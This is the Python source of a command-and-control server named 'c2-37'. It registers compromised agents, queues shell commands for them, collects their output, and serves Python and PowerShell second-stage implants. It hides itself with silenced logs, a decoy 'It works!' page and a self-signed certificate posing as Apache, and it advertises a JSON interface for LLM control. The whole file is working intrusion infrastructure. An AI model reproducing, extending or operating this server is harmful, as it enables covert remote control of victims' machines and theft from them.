"""c2-37 server — the mothership.

HTTP/HTTPS listener that manages agents, queues commands,
and serves staged payloads. JSON-native for LLM integration.
"""
from __future__ import annotations

import json
import ssl
import time
import uuid
import threading
from dataclasses import dataclass, field, asdict
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional


@dataclass
class Agent:
    """A checked-in agent."""
    id: str
    hostname: str
    username: str
    os: str
    ip: str
    first_seen: float
    last_seen: float
    command_queue: list[dict] = field(default_factory=list)
    results: list[dict] = field(default_factory=list)
    sleep: int = 5
    jitter: int = 20  # percentage
    platform: str = "unknown"  # linux, windows, android

    def to_json(self) -> dict:
        return {
            "id": self.id,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os,
            "ip": self.ip,
            "platform": self.platform,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "sleep": self.sleep,
            "jitter": self.jitter,
            "pending_commands": len(self.command_queue),
            "results_count": len(self.results),
        }


class C2Server:
    """Core C2 server — manages agents and command queues."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8037,
                 ssl_cert: str = None, ssl_key: str = None):
        self.host = host
        self.port = port
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self.agents: dict[str, Agent] = {}
        self.listeners: list[dict] = []
        self.lock = threading.Lock()
        self._server: Optional[HTTPServer] = None
        self._stage2_payload: Optional[bytes] = None
        self._stage2_ps: Optional[bytes] = None  # PowerShell stage

    # ── Agent management ───────────────────────────────────

    def register_agent(self, info: dict) -> Agent:
        """Register a new agent or update an existing one."""
        agent_id = info.get("id") or str(uuid.uuid4())[:8]
        now = time.time()

        # Detect platform from OS string
        os_str = info.get("os", "").lower()
        if "android" in os_str or info.get("platform") == "android":
            plat = "android"
        elif "windows" in os_str:
            plat = "windows"
        elif "linux" in os_str or "darwin" in os_str:
            plat = "linux"
        else:
            plat = "unknown"

        with self.lock:
            if agent_id in self.agents:
                self.agents[agent_id].last_seen = now
                self.agents[agent_id].ip = info.get("ip", self.agents[agent_id].ip)
                return self.agents[agent_id]
            agent = Agent(
                id=agent_id,
                hostname=info.get("hostname", "unknown"),
                username=info.get("username", "unknown"),
                os=info.get("os", "unknown"),
                ip=info.get("ip", "unknown"),
                first_seen=now,
                last_seen=now,
                platform=plat,
            )
            self.agents[agent_id] = agent
        return agent

    def get_commands(self, agent_id: str) -> list[dict]:
        """Pop queued commands for an agent (called on beacon)."""
        with self.lock:
            agent = self.agents.get(agent_id)
            if not agent:
                return []
            agent.last_seen = time.time()
            cmds = list(agent.command_queue)
            agent.command_queue.clear()
            return cmds

    def queue_command(self, agent_id: str, cmd_type: str, args: dict) -> dict:
        """Queue a command for an agent."""
        cmd = {
            "id": str(uuid.uuid4())[:8],
            "type": cmd_type,
            "args": args,
            "queued_at": time.time(),
        }
        with self.lock:
            agent = self.agents.get(agent_id)
            if not agent:
                return {"error": f"agent {agent_id} not found"}
            agent.command_queue.append(cmd)
        return cmd

    def store_result(self, agent_id: str, result: dict):
        """Store a command result from an agent."""
        with self.lock:
            agent = self.agents.get(agent_id)
            if agent:
                agent.last_seen = time.time()
                agent.results.append(result)

    # ── HTTP Handler ───────────────────────────────────────

    def _make_handler(server_ref):
        """Create request handler with reference to C2Server."""

        class C2Handler(BaseHTTPRequestHandler):
            c2 = server_ref

            def log_message(self, format, *args):
                pass  # silent

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length) if length else b""

                try:
                    data = json.loads(body) if body else {}
                except json.JSONDecodeError:
                    data = {}

                # ── /register — agent check-in ──
                if self.path == "/register":
                    data["ip"] = self.client_address[0]
                    agent = self.c2.register_agent(data)
                    self._json_response({
                        "status": "ok",
                        "id": agent.id,
                        "sleep": agent.sleep,
                        "jitter": agent.jitter,
                    })
                    return

                # ── /beacon — agent polls for commands ──
                elif self.path == "/beacon":
                    aid = data.get("id", "")
                    cmds = self.c2.get_commands(aid)
                    self._json_response({"commands": cmds})
                    return

                # ── /result — agent returns command output ──
                elif self.path == "/result":
                    aid = data.get("id", "")
                    self.c2.store_result(aid, data)
                    self._json_response({"status": "ok"})
                    return

                # ── /api/cmd — operator queues command ──
                elif self.path == "/api/cmd":
                    aid = data.get("agent_id", "")
                    cmd_type = data.get("type", "shell")
                    cmd_args = data.get("args", {})
                    result = self.c2.queue_command(aid, cmd_type, cmd_args)
                    self._json_response(result)
                    return

                else:
                    self._json_response({"error": "not found"}, 404)

            def do_GET(self):
                # ── /stage — serve Python stage 2 payload ──
                if self.path == "/stage":
                    if self.c2._stage2_payload:
                        self.send_response(200)
                        self.send_header("Content-Type", "application/octet-stream")
                        self.end_headers()
                        self.wfile.write(self.c2._stage2_payload)
                    else:
                        # Auto-generate from implant source
                        try:
                            from c2_37 import payloads
                            scheme = "https" if self.c2.ssl_cert else "http"
                            host = self.headers.get("Host", f"{self.c2.host}:{self.c2.port}")
                            url = f"{scheme}://{host}"
                            code = payloads.python_implant(url)
                            self.send_response(200)
                            self.send_header("Content-Type", "application/octet-stream")
                            self.end_headers()
                            self.wfile.write(code.encode())
                        except Exception:
                            self._json_response({"error": "no payload"}, 404)
                    return

                # ── /stage/ps — serve PowerShell stage 2 ──
                elif self.path == "/stage/ps":
                    if self.c2._stage2_ps:
                        self.send_response(200)
                        self.send_header("Content-Type", "text/plain")
                        self.end_headers()
                        self.wfile.write(self.c2._stage2_ps)
                    else:
                        try:
                            from c2_37 import payloads
                            scheme = "https" if self.c2.ssl_cert else "http"
                            host = self.headers.get("Host", f"{self.c2.host}:{self.c2.port}")
                            url = f"{scheme}://{host}"
                            code = payloads.powershell_implant(url)
                            self.send_response(200)
                            self.send_header("Content-Type", "text/plain")
                            self.end_headers()
                            self.wfile.write(code.encode())
                        except Exception:
                            self._json_response({"error": "no payload"}, 404)
                    return

                # ── /api/agents — list agents (operator) ──
                elif self.path == "/api/agents":
                    with self.c2.lock:
                        agents = [a.to_json() for a in self.c2.agents.values()]
                    self._json_response({"agents": agents})
                    return

                # ── /api/results/<agent_id> — get results ──
                elif self.path.startswith("/api/results/"):
                    aid = self.path.split("/")[-1]
                    with self.c2.lock:
                        agent = self.c2.agents.get(aid)
                        results = list(agent.results) if agent else []
                    self._json_response({"results": results})
                    return

                # ── /api/modules — list available modules ──
                elif self.path == "/api/modules":
                    try:
                        from c2_37.modules import list_modules
                        self._json_response({"modules": list_modules()})
                    except ImportError:
                        self._json_response({"modules": []})
                    return

                # ── /dashboard — operator web UI ──
                elif self.path == "/dashboard" or self.path == "/dashboard/":
                    try:
                        from c2_37.dashboard import get_dashboard_html
                        html = get_dashboard_html()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/html; charset=utf-8")
                        self.end_headers()
                        self.wfile.write(html.encode())
                    except ImportError:
                        self._json_response({"error": "dashboard not installed"}, 500)
                    return

                else:
                    # Default: look like a normal web server
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body><h1>It works!</h1></body></html>")

            def _json_response(self, data: dict, code: int = 200):
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(data).encode())

        return C2Handler

    # ── Server lifecycle ───────────────────────────────────

    def start(self, background: bool = True):
        """Start the C2 listener."""
        handler = C2Server._make_handler(self)
        self._server = HTTPServer((self.host, self.port), handler)

        # TLS support
        if self.ssl_cert and self.ssl_key:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(self.ssl_cert, self.ssl_key)
            self._server.socket = ctx.wrap_socket(self._server.socket, server_side=True)

        if background:
            t = threading.Thread(target=self._server.serve_forever, daemon=True)
            t.start()
        else:
            self._server.serve_forever()

    def stop(self):
        """Stop the listener."""
        if self._server:
            self._server.shutdown()

    def set_stage2(self, payload: bytes):
        """Set the Python stage 2 payload served at /stage."""
        self._stage2_payload = payload

    def set_stage2_ps(self, payload: bytes):
        """Set the PowerShell stage 2 payload served at /stage/ps."""
        self._stage2_ps = payload

    def generate_self_signed_cert(self, cert_path: str = "/tmp/c2.pem",
                                   key_path: str = "/tmp/c2.key") -> tuple[str, str]:
        """Generate a self-signed TLS certificate for HTTPS."""
        import subprocess
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", key_path, "-out", cert_path,
            "-days", "365", "-nodes",
            "-subj", "/CN=localhost/O=Apache/C=US"
        ], capture_output=True, check=True)
        self.ssl_cert = cert_path
        self.ssl_key = key_path
        return cert_path, key_path

    # ── JSON API (for LLM/programmatic use) ────────────────

    def status(self) -> dict:
        """Full server status as JSON."""
        with self.lock:
            return {
                "host": self.host,
                "port": self.port,
                "tls": bool(self.ssl_cert),
                "agents": len(self.agents),
                "agent_list": [a.to_json() for a in self.agents.values()],
            }
